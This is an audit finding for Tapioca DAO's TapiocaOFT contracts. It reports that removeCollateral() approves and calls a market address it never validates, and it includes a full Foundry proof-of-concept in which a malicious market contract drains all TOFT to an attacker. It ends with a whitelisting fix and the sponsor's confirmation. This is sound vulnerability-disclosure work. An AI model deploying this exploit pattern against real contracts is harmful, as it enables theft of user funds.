[H-01] TOFT in (m)TapiocaOft contracts can be stolen by calling removeCollateral() with a malicious removeParams.market
Submitted by0x73696d616f
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L190
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L516
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L230-L231
TheTOFTavailable in theTapiocaOFTcontract can be stolen when callingremoveCollateral()with a malicious market.
Proof of Concept
(m)TapiocaOFTinheritBaseTOFT, which has a functionremoveCollateral()that accepts a market address as an argument. This function calls_lzSend()internally on the source chain, which then is forwarded to the destination chain by the relayer and callslzReceive().
lzReceive()reaches_nonBlockingLzReceive()inBaseTOFTand delegate calls to theBaseTOFTMarketModuleon functionremove(). This function approvesTOFTto theremoveParams.marketand then calls functionremoveCollateral()of the provided market. There is no validation whatsoever in this address, such that a malicious market can be provided that steals all funds, as can be seen below:
functionremove(bytesmemory_payload)public{...approve(removeParams.market,removeParams.share);// no validation prior to this 2 callsIMarket(removeParams.market).removeCollateral(to,to,removeParams.share);...}
The following POC in Foundry demonstrates this vulnerability, the attacker is able to steal allTOFTinmTapiocaOFT:
// SPDX-License-Identifier: UNLICENSEDpragmasolidity^0.8.18;import{Test,console}from"forge-std/Test.sol";import{TapiocaOFT}from"contracts/tOFT/TapiocaOFT.sol";import{BaseTOFTMarketModule}from"contracts/tOFT/modules/BaseTOFTMarketModule.sol";import{IYieldBoxBase}from"tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";import{ISendFrom}from"tapioca-periph/contracts/interfaces/ISendFrom.sol";import{ICommonData}from"tapioca-periph/contracts/interfaces/ICommonData.sol";import{ITapiocaOFT}from"tapioca-periph/contracts/interfaces/ITapiocaOFT.sol";import{IERC20}from"@openzeppelin/contracts/token/ERC20/IERC20.sol";contractMaliciousMarket{addresspublicimmutableattacker;addresspublicimmutabletapiocaOft;constructor(addressattacker_,addresstapiocaOft_) {attacker=attacker_;tapiocaOft=tapiocaOft_;}functionremoveCollateral(address,address,uint256share)external{IERC20(tapiocaOft).transferFrom(msg.sender,attacker,share);}}contractTapiocaOFTPOCisTest{addresspublicconstantLZ_ENDPOINT=0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;uint16internalconstantPT_MARKET_REMOVE_COLLATERAL=772;functiontest_POC_StealAllAssetsInTapiocaOFT_RemoveCollateral_MaliciousMarket()public{vm.createSelectFork("https://eth.llamarpc.com");addressmarketModule_=address(newBaseTOFTMarketModule(address(LZ_ENDPOINT),address(0),IYieldBoxBase(address(2)),"SomeName","SomeSymbol",18,block.chainid));TapiocaOFTtapiocaOft_=newTapiocaOFT(LZ_ENDPOINT,address(0),IYieldBoxBase(address(3)),"SomeName","SomeSymbol",18,block.chainid,payable(address(1)),payable(address(2)),payable(marketModule_),payable(address(4)));// TOFT is acummulated in the TapiocaOft contract and can be stolen by the malicious market// for example, strategyDeposit of the BaseTOFTMarketModule credits TOFT to tapiocaOftuint256tOftInTapiocaOft_=1ether;deal(address(tapiocaOft_),address(tapiocaOft_),tOftInTapiocaOft_);addressattacker_=makeAddr("attacker");deal(attacker_,1ether);// lz feesuint16lzDstChainId_=102;addresszroPaymentAddress_=address(0);ICommonData.IWithdrawParamsmemorywithdrawParams_;ITapiocaOFT.IRemoveParamsmemoryremoveParams_;removeParams_.share=tOftInTapiocaOft_;removeParams_.market=address(newMaliciousMarket(attacker_,address(tapiocaOft_)));ICommonData.IApproval[]memoryapprovals_;bytesmemoryadapterParams_;tapiocaOft_.setTrustedRemoteAddress(lzDstChainId_,abi.encodePacked(tapiocaOft_));vm.prank(attacker_);tapiocaOft_.removeCollateral{value:1ether}(attacker_,attacker_,lzDstChainId_,zroPaymentAddress_,withdrawParams_,removeParams_,approvals_,adapterParams_);bytesmemorylzPayload_=abi.encode(PT_MARKET_REMOVE_COLLATERAL,attacker_,attacker_,bytes32(bytes20(attacker_)),removeParams_,withdrawParams_,approvals_);vm.prank(LZ_ENDPOINT);tapiocaOft_.lzReceive(lzDstChainId_,abi.encodePacked(tapiocaOft_,tapiocaOft_),0,lzPayload_);assertEq(tapiocaOft_.balanceOf(attacker_),tOftInTapiocaOft_);}}
Tools Used
Vscode, Foundry
Recommended Mitigation Steps
Whitelist theremoveParams.marketaddress to prevent users from providing malicious markets.
0xRektora (Tapioca) confirmed